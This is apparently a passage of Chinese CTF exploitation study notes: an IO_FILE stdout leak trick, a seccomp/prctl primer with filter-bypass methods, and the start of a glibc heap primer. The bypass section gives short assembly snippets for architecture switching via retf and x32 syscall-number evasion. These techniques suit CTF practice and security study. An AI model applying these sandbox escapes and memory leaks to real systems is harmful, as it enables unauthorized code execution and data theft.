_IO_IS_APPENDING)\n     fp->_offset = _IO_pos_BAD;\n```\n\n(2)针对else if (fp->_IO_read_end != fp->_IO_write_base)，这个不太能够进入，因为该语句如下：\n\n```\nelse if (fp->_IO_read_end != fp->_IO_write_base)\n{\n    _IO_off64_t new_pos = _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);\n    if (new_pos == _IO_pos_BAD)\n        return 0;\n    fp->_offset = new_pos;\n}\n```\n\n因为_IO_SYSSEEK可能会执行错误，崩溃，无法到达count的执行语句。而且fp->_IO_read_end != fp->_IO_write_base判断语句满足的概率相当大，这就导致如果第一个if不进入，那么第二个else if就有很大概率进入，然后就可能会崩溃。所以在只能设置flags值的情况下还是进入第一个If语句是最好的选择。\n\n所以需要满足条件：fp->_flags & _IO_IS_APPENDING == true\n\n▲后面才想明白是因为如果只设置flags的话，而_IO_read_end和_IO_write_base的值无法控制的情况下，最好使程序流进去if (fp->_flags & _IO_IS_APPENDING)语句，而不要使程序流进入else if语句。\n\n4.综上三个条件：\n\n```\n#注释头\n\nf->_flags & _IO_NO_WRITES == FALSE\n((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL) == FALSE\nfp->_flags & _IO_IS_APPENDING == TRUE\n```\n\n再加上flags值的相关宏定义：\n\n```\n#注释头\n\n//高16位\n#define _IO_MAGIC 0xFBAD0000 /* Magic number */\n#define _OLD_STDIO_MAGIC 0xFABC0000 /* Emulate old stdio. */\n#define _IO_MAGIC_MASK 0xFFFF0000\n\n//低16位\n-------------------------------------------------------------------\n#define _IO_USER_BUF 1 /* User owns buffer; don't delete it on close. */\n#define _IO_UNBUFFERED 2\n#define _IO_NO_READS 4 /* Reading not allowed */\n#define _IO_NO_WRITES 8 /* Writing not allowd */\n#define _IO_EOF_SEEN 0x10\n#define _IO_ERR_SEEN 0x20\n#define _IO_DELETE_DONT_CLOSE 0x40 /* Don't call close(_fileno) on cleanup. */\n#define _IO_LINKED 0x80 /* Set if linked (using _chain) to streambuf::_list_all.*/\n#define _IO_IN_BACKUP 0x100\n#define _IO_LINE_BUF 0x200\n#define _IO_TIED_PUT_GET 0x400 /* Set if put and get pointer logicly tied. */\n#define _IO_CURRENTLY_PUTTING 0x800\n#define _IO_IS_APPENDING 0x1000\n#define _IO_IS_FILEBUF 0x2000\n#define _IO_BAD_SEEN 0x4000\n#define _IO_USER_LOCK 0x8000\n```\n\nflags的高16位为_IO_MAGIC，基本固定，由libc确定，不同版本可能有差异。后面低16位分别对应不同的表示。\n\n可得最终的flags应该为0xFBAD1800，其实也不一定非得是这个值，只要满足以上所列的条件即可：\n\nf->flag & 0xa00 and f->flag & 0x1000 == 1以及f->write_base != f->write_ptr\n\n最后设置_IO_write_base指向想要泄露的位置，_IO_write_ptr指向泄露结束的位置即可。\n\n▲这里需要注意的是_IO_CURRENTLY_PUTTING标志位在程序已经有打印过东西的情况下就已经是1了，没有打印过则为0。\n\n \n\n \n","tags":["pwn-Skill"],"categories":["PWN"]},{"title":"Seccomp_Before","url":"/2021/08/19/Seccomp_Before/","content":"\n1.常见Seccomp：\n\n(1)库安装：\n\n```\n#注释头\n\napt install libseccomp-dev libseccomp2 seccomp\n```\n\n(2)正常的使用seccopm开启：\n\n①先创建初始化scmp_filter_ctx结构体，并且给定初始规则：\n\nscmp_filter_ctx ctx = seccomp_init(SCMP_ACT_ALLOW);\n\n这里将初始规则设置为SCMP_ACT_ALLOW，即允许所有的系统调用。另有规则如下：\n\n```\n#注释头\n\n/**\n* Kill the process\n*/\n#define SCMP_ACT_KILL_PROCESS 0x80000000U\n/**\n* Kill the thread\n*/\n#define SCMP_ACT_KILL_THREAD 0x00000000U\n/**\n* Kill the thread, defined for backward compatibility\n*/\n#define SCMP_ACT_KILL SCMP_ACT_KILL_THREAD\n/**\n* Throw a SIGSYS signal\n*/\n#define SCMP_ACT_TRAP 0x00030000U\n/**\n* Notifies userspace\n*/\n#define SCMP_ACT_NOTIFY 0x7fc00000U\n/**\n* Return the specified error code\n*/\n#define SCMP_ACT_ERRNO(x) (0x00050000U | ((x) & 0x0000ffffU))\n/**\n* Notify a tracing process with the specified value\n*/\n#define SCMP_ACT_TRACE(x) (0x7ff00000U | ((x) & 0x0000ffffU))\n/**\n* Allow the syscall to be executed after the action has been logged\n*/\n#define SCMP_ACT_LOG 0x7ffc0000U\n/**\n* Allow the syscall to be executed\n*/\n#define SCMP_ACT_ALLOW 0x7fff0000U\n\n/* SECCOMP_RET_USER_NOTIF was added in kernel v5.0. */\n#ifndef SECCOMP_RET_USER_NOTIF\n#define SECCOMP_RET_USER_NOTIF 0x7fc00000U\n```\n\n②添加规则，即添加白名单或者黑名单：\n\nseccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);\n\n这里将系统调用execve给禁止了。函数原型：\n\n```\n#注释头\n\n/**\n* Add a new rule to the filter\n* @param ctx the filter context\n* @param action the filter action\n* @param syscall the syscall number\n* @param arg_cnt the number of argument filters in the argument filter chain\n* @param ... scmp_arg_cmp structs (use of SCMP_ARG_CMP() recommended)\n*\n* This function adds a series of new argument/value checks to the seccomp\n* filter for the given syscall; multiple argument/value checks can be\n* specified and they will be chained together (AND'd together) in the filter.\n* If the specified rule needs to be adjusted due to architecture specifics it\n* will be adjusted without notification. Returns zero on success, negative\n* values on failure.\n*\n*/\nint seccomp_rule_add(scmp_filter_ctx ctx,\nuint32_t action, int syscall, unsigned int arg_cnt, ...);\n```\n\n即(结构体，规则，规则生效的系统调用，arg_cnt，scmp_arg_cmp)。\n\nA.其中arg_cnt表示函数seccomp_rule_add后面传入参数的个数，如果为0，则直接禁止execve，后面的scmp_arg_cmp都不用赋值，赋值了也没用。\n\nB.如果不为0，则再看之后seccomp_rule_add函数之后传入的参数，赋值为1，则只允许一条规则。赋值为2，则需同时满足之后的两条规则才会生效。例如：\n\n```\n#注释头\n\n//从0开始计算参数个数\nseccomp_rule_add(ctx,SCMP_ACT_KILL,SCMP_SYS(write),1,\n        SCMP_A2(SCMP_CMP_EQ,0x10));\nwrite(1,\"1234567812345678\",0x10);//被拦截\n\nseccomp_rule_add(ctx,SCMP_ACT_KILL,SCMP_SYS(write),2,\n        SCMP_A2(SCMP_CMP_EQ,0x10));\nwrite(1,\"1234567812345678\",0x10);//不被拦截\n//seccomp_rule_add参数个数设置为2，但是后续没有添加规则，则默认不满足，则不会生效\n\nseccomp_rule_add(ctx,SCMP_ACT_KILL,SCMP_SYS(write),2,\n        SCMP_A2(SCMP_CMP_EQ,0x10),SCMP_A0(SCMP_CMP_EQ,1));\nwrite(1,\"1234567812345678\",0x10);//被拦截\n\nseccomp_rule_add(ctx,SCMP_ACT_KILL,SCMP_SYS(write),2,\n        SCMP_A2(SCMP_CMP_EQ,0x10),SCMP_A0(SCMP_CMP_EQ,1));\nwrite(1,\"1234567812345678\",0x10);//不被拦截\n```\n\n但是使用seccomp，一旦被拦截，则程序直接打印错误信息并中断，无法执行之后的代码，规则如下：\n\n```\n#注释头\n\n/**\n* Specify an argument comparison struct for use in declaring rules\n* @param arg the argument number, starting at 0\n* @param op the comparison operator, e.g. SCMP_CMP_*\n* @param datum_a dependent on comparison\n* @param datum_b dependent on comparison, optional\n*/\n#define SCMP_CMP(...) ((struct scmp_arg_cmp){__VA_ARGS__})\n\n/**\n* Specify an argument comparison struct for argument 0\n*/\n#define SCMP_A0(...) SCMP_CMP(0, __VA_ARGS__)\n\n/**\n* Specify an argument comparison struct for argument 1\n*/\n#define SCMP_A1(...) SCMP_CMP(1, __VA_ARGS__)\n\n/**\n* Specify an argument comparison struct for argument 2\n*/\n#define SCMP_A2(...) SCMP_CMP(2, __VA_ARGS__)\n\n/**\n* Specify an argument comparison struct for argument 3\n*/\n#define SCMP_A3(...) SCMP_CMP(3, __VA_ARGS__)\n\n/**\n* Specify an argument comparison struct for argument 4\n*/\n#define SCMP_A4(...) SCMP_CMP(4, __VA_ARGS__)\n\n/**\n* Specify an argument comparison struct for argument 5\n*/\n#define SCMP_A5(...) SCMP_CMP(5, __VA_ARGS__)\n\n/**\n* Comparison operators\n*/\nenum scmp_compare {\n_SCMP_CMP_MIN = 0,\nSCMP_CMP_NE = 1, /**< not equal */\nSCMP_CMP_LT = 2, /**< less than */\nSCMP_CMP_LE = 3, /**< less than or equal */\nSCMP_CMP_EQ = 4, /**< equal */\nSCMP_CMP_GE = 5, /**< greater than or equal */\nSCMP_CMP_GT = 6, /**< greater than */\nSCMP_CMP_MASKED_EQ = 7, /**< masked equality */\n_SCMP_CMP_MAX,\n};\n\n/**\n* Argument datum\n*/\ntypedef uint64_t scmp_datum_t;\n\n/**\n* Argument / Value comparison definition\n*/\nstruct scmp_arg_cmp {\nunsigned int arg; /**< argument number, starting at 0 */\nenum scmp_compare op; /**< the comparison op, e.g. SCMP_CMP_* */\nscmp_datum_t datum_a;\nscmp_datum_t datum_b;\n};\n```\n\n③启用seccomp保护：\n\nseccomp_load(ctx);\n\n利用seccomp_load函数加载启用保护。函数原型：\n\n```\n#注释头\n\n/**\n* Return the notification fd from a filter that has already been loaded\n* @param ctx the filter context\n*\n* This returns the listener fd that was generated when the seccomp policy was\n* loaded. This is only valid after seccomp_load() with a filter that makes\n* use of SCMP_ACT_NOTIFY.\n*\n*/\nint seccomp_notify_fd(const scmp_filter_ctx ctx);\n```\n\n这里传入scmp_filter结构体即可，如果不传入\n\n以上的均可在seccomp.h中查看。\n\n▲总的调用就是：\n\n```\n#注释头\n\nscmp_filter_ctx ctx;\nctx = seccomp_init(SCMP_ACT_ALLOW);\nseccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);\nseccomp_load(ctx);\n```\n\n记得引用库：\n\n```\n#注释头\n\n#include <seccomp.h>\n#include <linux/seccomp.h>\n```\n\n \n\n2.Prtctl函数(/usr/includ/linux/prctl.h)：\n\n原型：\n\n```\n#注释头\n\nint prctl(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5);\n```\n\n这里的参数可以不需要全部设置上，其中option比较关键，在PWN中大致分以下情况：\n\n(1)若option为PR_SET_NO_NEW_PRIVS(38)：\n\n此时将第二个参数arg2设置为1，那么程序的子线程就无法通过execve来提权，就是pwn kernel中即使改掉了cred结构体，使其特权为0，再执行system(\"/bin/sh\")依然无法提权。即prctl(38, 1,0,0,0)表示禁用系统调用，也就是system和onegadget都没了，同时子进程也无法这样来获得shell。\n\n(2)若option为PR_SET_SECCOMP(22)：\n\n此时可以通过参数来设置规则，道理和seccomp一样的，规则如下：\n\n①如果arg2为SECCOMP_MODE_STRICT(1),则只允许调用read,write,_exit(这个exit不是退出程序的意思),sigreturn这几个syscall。即prctl(22,1,0,0,0)。\n\n②如果arg2为SECCOMP_MODE_FILTER(2),则为过滤模式,其中对syscall的限制通过参数3的结构体，来自定义过滤规则，函数会重定向到另一个同名函数，该函数的原型如下：\n\n```\n#注释头\n\nint prctl(int PR_SET_SECCOMP,const struct* sock_filter SECCOMP_MODE_FILTER,const sock_fprog prog);\n```\n\n但调用之前还是需要禁用execve，即调用形式为：\n\n```\n#注释头\n\nprctl(PR_SET_NO_NEW_PRIVS,1,0,0,0);   //这里是需要这么写的\nprctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&sfp);\n```\n\nA.参数SECCOMP_MODE_FILTER是一个结构体数组，该sock_filter结构体为：\n\n```\n#注释头\n\nstruct sock_filter { /* Filter block */\n__u16 code; /* Actual filter code */\n__u8 jt; /* Jump true */\n__u8 jf; /* Jump false */\n__u32 k; /* Generic multiuse field */\n};\n```\n\na.code:一个字节，详细定义操作的类型，假设code为0x15\n\n先看前四位：\n\n```\n#注释头\n\n#define BPF_CLASS(code)\n#define BPF_LD 0x00 \n#define BPF_LDX 0x01\n#define BPF_ST 0x02\n#define BPF_STX 0x03\n#define BPF_ALU 0x04\n#define BPF_JMP 0x05\n#define BPF_RET 0x06\n#define BPF_MISC 0x07\n```\n\n这里前四位就是0x5，所以对应到之后的四位定义域中去：\n\n```\n#注释头\n\n/*jmp fields */\n#define BPF_JA 0x00 \n#define BPF_JEQ 0x10\n#define BPF_JGT 0x20\n#define BPF_JGE 0x30\n#define BPF_JSET 0x40\n#define BPF_SRC(code) ((code) & 0x08)\n```\n\n那么这个0x15的操作就是BPF_JMP+BPF_JEQ。\n\n▲同理，ld、ldx、ALU都有对应的定义域：\n\n```\n#注释头\n\n/*ld fields */\n#define BPF_W 0x00\n#define BPF_H 0x08\n#define BPF_B 0x10\n\n/*ldx fields */  \n#define BPF_IMM 0x00\n#define BPF_ABS 0x20\n#define BPF_IND 0x40\n#define BPF_MEM 0x60\n#define BPF_LEN 0x80\n#define BPF_MSH 0xa0\n\n/*alu fields */\n#define BPF_ADD 0x00\n#define BPF_SUB 0x10\n#define BPF_MUL 0x20\n#define BPF_DIV 0x30\n#define BPF_OR 0x40\n#define BPF_AND 0x50\n#define BPF_LSH 0x60\n#define BPF_RSH 0x70\n#define BPF_NEG 0x80\n#define BPF_MOD 0x90\n#define BPF_XOR 0xa0\n\n/*常数*/\n#define BPF_K 0x00\n#define BPF_X 0x08\n```\n\n而RET一般对应BPF_K，然后在之后参数上写SECCOMP_RET_KILL或者SECCOMP_RET_ALLOW。MISC倒是没见过。\n\nb.JT和JF：是相对于当前语句的偏移。例如(1,0)，假设当前语句为0003，则代表之前语句为真，则跳转到0005，为假则跳转到0004。所以如果都是0，相当于是个无跳转语句，如果都是1，相当于是跳过下一条语句。\n\nc.K：可以当作一个参数。如果操作语句是比较，那么就相当于比较的右值A>=K？。以此类推。这个参数的值是从seccomp_data中：\n\n```\n#注释头\n\n(<linux/audit.h> ) \nstruct seccomp_data {\nint nr; /* System call number */\n__u32 arch; /* AUDIT_ARCH_* value*/\n__u64 instruction_pointer; /* CPU instruction pointer */\n__u64 args[6]; /* Up to 6 system call arguments */\n};\n```\n\n值即代表偏移，偏移字长为一个字节：\n\nK==0，代表nr；K==4，代表arch；K==8，代表args[0]。而args六个值相当于传参寄存器的值：ebx,ecx,edx,esi,edi,ebp(32位)，rdi,rsi,rdx,r10,r8,r9(64位)\n\n▲所以(0x15,0x00,0x01,0x0000003b)就代表if (A!= execve) goto offset_1。这里也可以用一个简单的操作来替代：BPF_JUMP(BPF_JMP+BPF_JEQ,59,0,1)。定义规则就可以如下：\n\n```\n#注释头\n\nstruct sock_filter sfi[] = {\n{0x20,0x00,0x00,0x00000000},\n{0x15,0x00,0x01,0xc000003b},\n{0x06,0x00,0x00,0x00000000},   //KILL\n{0x06,0x00,0x00,0x7fff0000}   //ALLOW\n};\n```\n\n或者\n\n```\n#注释头\n\nstruct sock_filter filter[] = {\nBPF_STMT(BPF_LD+BPF_W+BPF_ABS,0), \nBPF_JUMP(BPF_JMP+BPF_JEQ,59,0,1), \nBPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL), \nBPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW), \n};\n```\n\n由于在/usr/include/linux/bpf_common.h有宏定义，所以第二种情况也是可以的。\n\nB.sfp也是一个结构体：\n\n```\n#注释头\n\nstruct sock_fprog { /* Required for SO_ATTACH_FILTER. */\nunsigned short len; /* Number of filter blocks */\nstruct sock_filter *filter;\n};\n```\n\na.len即代表语句条数，比如上面的就是4;\n\nb.filter就是指向上面SECCOMP_MODE_FILTER这个结构体的指针。\n\n▲所以完整的就是：\n\n```\n#注释头\n\nstruct sock_filter sfi[] = {\nBPF_STMT(BPF_LD+BPF_W+BPF_ABS,0),\nBPF_JUMP(BPF_JMP+BPF_JEQ,59,0,1),\nBPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL),\nBPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW),\n};\nstruct sock_fprog sfp = {\n(unsigned short)(sizeof(filter)/sizeof(filter[0])),\nsfi,\n};\nprctl(PR_SET_NO_NEW_PRIVS,1,0,0,0); \nprctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&prog);\n```\n\n这样设置后，出来的效果如下：\n\n```\n#注释头\n\nroot@241adce81c0a:/ctf/seccomp# seccomp-tools dump ./prctl_test2\nline  CODE JT   JF   K\n=================================\n0000: 0x20 0x00 0x00 0x00000000 A = sys_number\n0001: 0x15 0x00 0x01 0x0000003b if (A != execve) goto 0003\n0002: 0x06 0x00 0x00 0x00000000 return KILL\n0003: 0x06 0x00 0x00 0x7fff0000 return ALLOW\n```\n\n \n\n3.简单的seccomp规则写：\n\n(1)依据简单语法写规则：\n\n```\n#注释头\n\nA = sys_number\nA == 257? e0:next\nA == 1? ok:next\nreturn ALLOW\ne0:\nreturn ERRNO(0)\nok:\nreturn ALLOW\n```\n\n保存为seccomp_asm\n\n(2)利用seccomp-tools来生成：\n\nseccomp-tools asm seccomp_asm -f raw|seccomp-tools disasm -\n\n```\n#注释头\n\nline  CODE JT   JF   K\n=================================\n0000: 0x20 0x00 0x00 0x00000000 A = sys_number\n0001: 0x15 0x02 0x00 0x00000101 if (A == openat) goto 0004\n0002: 0x15 0x02 0x00 0x00000001 if (A == write) goto 0005\n0003: 0x06 0x00 0x00 0x7fff0000 return ALLOW\n0004: 0x06 0x00 0x00 0x00050000 return ERRNO(0)\n0005: 0x06 0x00 0x00 0x7fff0000 return ALLOW\n```\n\n这样就可以方便写规则了，同样有个seccomp_bpf.h的东西，比较简单：\n\n[secfilter/seccomp-bpf.h at master · ahupowerdns/secfilter · GitHub](https://github.com/ahupowerdns/secfilter/blob/master/seccomp-bpf.h)\n\n \n\n4.常见种类及绕过方式：\n\n(1)禁用execve函数时，但是需要getshell才行，此时存在满足一定条件可以使用shellcode：\n\n①未检查arch：\n\n尝试使用shellcode将处理器转换，如果是x64则转为i386，同理类似。这样系统调用号11就不会被解析为64位中的__x64_sys_munmap，而是32位中的sys_execve，绕过检查。\n\n```\n#注释头\n\nto32:\nmov DWORD [rsp+4],0x23;\nretf;\n\nto64:\nmov DWORD [esp+4],0x33; \nretf;\n```\n\n由于retf的指令实际效果为：POP CS:EIP，这里CS为0x23即为64位，0x33即为32位，所以如果能找到控制栈的gadget那其实也可以直接用retf，毕竟retf其实也挺常见的。同时还有其他的好用ret指令：\n\n```\n#注释头\n\nRETQ：POP RIP\nRETN: POP EIP\nRETF: POP CS:EIP\n```\n\n参考SCTF2020里面的CoolCode\n\n②存在检查漏洞：if (A < 0x40000000)，如果对A >= 0x40000000没有限制，那么可以利用64位下的x32漏洞，使用 64位的存器地址和 32位的地址：\n\n具体原理不太懂，应该是传参原因吧，可能syscall的系统调用号寄存器为eax，导致系统调用号0x40000003b绕过if (A < 0x40000000)检查，然后以eax传入系统调用号为0x0000003b，仍然执行了execve。\n\n这样的话在原来的系统调用号加上0x400000000即可绕过检查：\n\n```\n#注释头\n\nmov rax,59+0x40000000;\nsyscall;\n```\n\n(2)禁用evecve等函数，告诉了flag位置，或者将flag位置什么的放在了栈上(可以用peda插件：find flag)，又或者需要自己调试爆破flag的位置，不能getshell的，利用open,write,read等没有被禁用的函数进行读取：\n\n①shellcode模式：这里就根据各种规则限制来绕过，自己编写shellcode。(这个需要汇编基础，遇到题目慢慢学吧)\n\n②ROP模式：一般需要劫持栈再来ROP，其实和shellcode差不多的。这种情况一般是禁用了mprotect，所以没办法直接使用shellcode了，那么就利用ROP来搞，借助libc上的syscall。但是这里的open不知道为什么有时候执行不了，所以可以用借助syscall加上open的系统调用号来执行open。\n\n如果没有禁止mprotect，那么通常可以配合SigreturnFrame()，free_hook，setcontext来将堆上内存权限改为可执行，然后再在堆上使用shellcode也可以。\n\n▲有些禁用了open,write,read，那么其实这种情况下可以调用对应的openat，readv，和writev，其实效果一样的，因为前面三个函数其实都对应调用后面的三个函数。如果实在没办法打印，可以利用题目中的错误信息输出，修改IO_FILE来打印，读取。还有更强的用ptrace修改系统调用号，zer0pts CTF2020的sycall kit。实在找不到，后面再补坑吧。\n\n(3)控制了open,write,read的参数：\n\n```\n#注释头\n\n0000: 0x20 0x00 0x00 0x00000004 A = arch\n0001: 0x15 0x00 0x0b 0xc000003e if (A != ARCH_X86_64) goto 0013\n0002: 0x20 0x00 0x00 0x00000000 A = sys_number\n0003: 0x35 0x00 0x01 0x40000000 if (A < 0x40000000) goto 0005\n0004: 0x15 0x00 0x08 0xffffffff if (A != 0xffffffff) goto 0013\n0005: 0x15 0x06 0x00 0x00000002 if (A == open) goto 0012\n0006: 0x15 0x00 0x06 0x00000000 if (A != read) goto 0013\n0007: 0x20 0x00 0x00 0x00000014 A = fd >> 32 # read(fd, buf, count)\n0008: 0x25 0x03 0x00 0x00000000 if (A > 0x0) goto 0012\n0009: 0x15 0x00 0x03 0x00000000 if (A != 0x0) goto 0013\n0010: 0x20 0x00 0x00 0x00000010 A = fd # read(fd, buf, count)\n0011: 0x35 0x00 0x01 0x00000004 if (A < 0x4) goto 0013\n0012: 0x06 0x00 0x00 0x7fff0000 return ALLOW\n0013: 0x06 0x00 0x00 0x00000000 return KILL\n```\n\n \n\n```\n#注释头\n\n0000: 0x20 0x00 0x00 0x00000004 A = arch\n0001: 0x15 0x00 0x12 0xc000003e if (A != ARCH_X86_64) goto 0020\n0002: 0x20 0x00 0x00 0x00000000 A = sys_number\n0003: 0x35 0x00 0x01 0x40000000 if (A < 0x40000000) goto 0005\n0004: 0x15 0x00 0x0f 0xffffffff if (A != 0xffffffff) goto 0020\n0005: 0x15 0x0d 0x00 0x00000002 if (A == open) goto 0019\n0006: 0x15 0x0c 0x00 0x00000003 if (A == close) goto 0019\n0007: 0x15 0x0b 0x00 0x0000000a if (A == mprotect) goto 0019\n0008: 0x15 0x0a 0x00 0x000000e7 if (A == exit_group) goto 0019\n0009: 0x15 0x00 0x04 0x00000000 if (A != read) goto 0014\n0010: 0x20 0x00 0x00 0x00000014 A = fd >> 32 # read(fd, buf, count)\n0011: 0x15 0x00 0x08 0x00000000 if (A != 0x0) goto 0020\n0012: 0x20 0x00 0x00 0x00000010 A = fd # read(fd, buf, count)\n0013: 0x15 0x05 0x06 0x00000000 if (A == 0x0) goto 0019 else goto 0020\n0014: 0x15 0x00 0x05 0x00000001 if (A != write) goto 0020\n0015: 0x20 0x00 0x00 0x00000014 A = fd >> 32 # write(fd, buf, count)\n0016: 0x15 0x00 0x03 0x00000000 if (A != 0x0) goto 0020\n0017: 0x20 0x00 0x00 0x00000010 A = fd # write(fd, buf, count)\n0018: 0x15 0x00 0x01 0x00000001 if (A != 0x1) goto 0020\n0019: 0x06 0x00 0x00 0x7fff0000 return ALLOW\n0020: 0x06 0x00 0x00 0x00000000 return KILL\n```\n\n类似这种限制fd的，可以先close再open，改变fd，同样对应参数也可以适当做一些修改来绕过。\n\n \n\n参考资料：\n\n[seccomp沙盒逃逸基础——沙盒的规则编写 - p0lar1s - 博客园 (cnblogs.com)](https://www.cnblogs.com/p0lar1s/p/14697070.html#基于bpf伯克利分组过滤器的seccomp库函数)\n\n[(*´∇｀*) 被你发现啦~ seccomp学习笔记 | A1ex's Blog](https://a1ex.online/2020/09/27/seccomp学习笔记/)\n\n[PWN题中常见的seccomp绕过方法 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/219077#h2-0)\n\n[Seccomp从0到1 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/208364#h2-10)\n\n等等，贴不过来了。\n","tags":["ORW-Skill"],"categories":["ORW"]},{"title":"堆前置知识总结","url":"/2021/08/19/堆前置知识总结/","content":"\n一、main_arena总概\n\n1.arena:堆内存本身\n\n(1)主线程的main_arena:由sbrk函数创建。\n\n①最开始调用sbrk函数创建大小为(128 KB + chunk_size) align 4KB 的空间作为 heap\n\n②当不够用时，用sbrk或者mmap增加heap大小。\n\n(2)其它线程的per thread arena:由mmap创建。\n\n①最开始调用 mmap 映射一块大小为HEAP_MAX_SIZE（32 位系统上默认为 1MB，64 位系统上默认为 64MB）的空间作为 sub-heap。\n\n②当不够用时，会调用 mmap 映射一块新的 sub-heap，也就是增加 top chunk 的大小，每次 heap 增加的值都会对齐到4KB。\n\n2.malloc_state:管理arena的一个结构，包括堆状态信息，bins链表等等\n\n(1)main_arena对应的malloc_state存储在glibc的全局变量中\n\n(如果可以泄露malloc_state结构体的地址，那么就可以泄露glibc的地址)\n\n(2)per thread arena对应的malloc_state存储在各自本身的arena\n\n3.bins:用链表结构管理空闲的chunk块，通过free释放进入的chunk块(垃圾桶)\n\n4.chunks:一般意义上的堆内存块\n\n```c\n#注释头\n\nstruct malloc_state{\nmutex_t mutex;//(相当于多线程的互斥锁)\nint flags;//(记录分配器的一些标志，bit0 用于标识分配区是否包含至少一个 fast bin chunk，bit1 用于标识分配区是否能返回连续的虚拟地址空间。)\nmfastbinptr fastbinsY[NFASTBINS];//(一个数组，里面的元素是各个不同大小的fastbins的首地址)\nmchunkptr top;//(top chunk的首地址)\nmchunkptr last_remainder;//(某些情况下切割剩下来的堆块)\nmchunkptr bins[NBINS*2-2];\n.......................................................\nunsigned int binmap[BINMAPSIZE];//(以bit为单位的数组，共128bit，16个字节，4个int，由于bin的数量为128，对于这里面的128bit，为0表该bin没用有空闲块，为1表有空闲块。通过四个int的大小可以找出不同index的bin中是否有空闲块。这个在某些时候会用到。)\n......//后面还有，不太重要\n}\n```\n\n▲内存中的堆情况：\n\n全局变量glibc:main_arena = struct malloc_state:\n\n| mutes | bin  | ..... | top  | lastremainder |\n| ----- | ---- | ----- | ---- | ------------- |\n|       |      |       |      |               |\n\n \n\n| Allocated chunk | Allocated chunk | Freechunk1 | Allocated chunk | Freechunk2 | Allocated chunk | Topchunk |\n| --------------- | --------------- | ---------- | --------------- | ---------- | --------------- | -------- |\n|                 |                 |            |                 |            |                 |          |\n\n低地址------------------------------------------------------------- ------------------>高地址\n\n由sbrk创建的main_arena\n\n(1)可以把bin也当作一个chunk，不同Bins管理结构不同，有单向链表管理和双向链表管理。\n\n(2)top里的bk保存Topchunk的首地址。\n\n(bk和fd只用于Bins链表中，allocated_chunk中是属于用户可以使用的内容)\n\n \n\n \n\n \n\n二、chunk结构：\n\n1.在使用中的allocated_chunk和未被使用的free_chunk：\n\n(1)allocated_chunk：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs1.png)\n\n(2)free_chunk:\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs2.png)\n\n2.prev_size：8字节，保存前一个chunk的大小，在allocatedchunk中属于用户数据，参考上述的图片，free_chunk的下一个chunk的pre_size位为该free_chunk的size。\n\n3.size:8字节，保存当前chunk大小。(free和allocated都有用)一个chunk的size以0x10递增，以0x20为最小chunk。\n\n(1)malloc(0x01)：会有0x20这么大，实际用户可用数据就是0x18。size=0x21\n\n(2)malloc(0x01-0x18)：仍然0x20这么大，实际用户可用数据就是0x18。size=0x21\n\n(3)malloc(0x18)：会有0x30这么大，实际用户可用数据是0x28。size=0x31\n\n所以size这个8字节内存的最低4位都不会被用到，所以malloc管理机制给最低的3位搞了个特殊形式标志位，A,M,P，分别代表不同内容。\n\n①A:NON_MAIN_ARENA，代表是否属于非main_arena，1表是，0表否。就是线程的不同。\n\n```c\n#注释头\n\n#define chunk_non_main_arena(p) ((p)->size & NON_MAIN_ARENA)\n```\n\n②M:IS_MMAPPED，代表当前chunk是否是mmap出来的。\n\n```c\n#注释头\n\n#define chunk_is_mmapped(p) ((p)->size & IS_MMAPPED)\n```\n\n③P:PREV_INUSE，代表前一个chunk是否正在被使用，处于allocated还是free。\n\n```c\n#注释头\n\n#define prev_inuse(p) ((p)->size & PREV_INUSE)\n```\n\n(标志位为1都代表是，0都代表否)\n\n \n\n三、bins结构：\n\n1.fastbins:放在struct malloc_state中的mfastbinptr fastbinsY[NFASTBINS]数组中。\n\n(1)归类方式：只使用fd位\n\n①bin的index为1，bins[0],bins[1]组成一个bin。\n\n②规定大小的chunk归到一类，但个数有限，不同版本不同，同时也可以设置其范围：\n\nM_MXFAST即为其最大的参数，可以通过 mallopt()进行设置，但最大只能是80B。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs3.jpg)\n\n(2)单向链表：\n\n▲例子：a=malloc(0x10); b=malloc(0x10); c=malloc(0x10); d=malloc(0x10)\n\nFastbinY,d,c,b,a\n\n①free(a)之后：\n\n```c\n#注释头\n\nfastbinY[0x20]->a;       a.fd=0\n```\n\n②free(b)之后：\n\n```c\n#注释头\n\nfastbinY[0x20]->b;       b.fd=a       a.fd=0\n```\n\n③free(c)之后：\n\n```c\n#注释头\n\nfastbinY[0x20]->c;        c.fd=b       b.fd->a;    a.fd=0\n```\n\n④free(d)之后：\n\n```c\n#注释头\n\nfastbinY[0x20]->d;       d.fd=c       c.fd->b;     b.fd->a;    a.fd=0\n```\n\n(3)后进先出：\n\n①m=malloc(0x10):      m->d\n\n②n=malloc(0x10):      n->c\n\n(4)不改变IN_USE位(p位):\n\n如果某个chunk进入到fastbin中，那么该chunk的下一个chunk的IN_USE位还是为1，不会改变成0。\n\n例子：a=malloc(0x10); b=malloc(0x10); c=malloc(0x10);\n\n①free(a)之后:     b.p=1\n\n②free(b)之后：   c.p=1;   b.p=1\n\np位不会变成0，如果该chunk进入到fastbins中。\n\n可以进行free(0),free(1),free(0)，但是不能直接free(0)两次。\n\n(5)除了malloc_consolidate函数会清空fastbins，其它的操作都不会减少fastbins中chunk的数量。\n\n \n\n \n\n2.smallbins:放在bins[2]-bins[125]中，共计62组，是一个双向链表。最大chunk的大小不超过1024字节\n\n(1)归类方式：\n\n①相同大小的chunk归到一类：大小范围[0x20,0x3f0]，0x20、0x30、....0x3f0。每组bins中的chunk大小一定。\n\n②每组bin中的chunk大小有如下关系：Chunk_size=2 * SIZE_SZ * 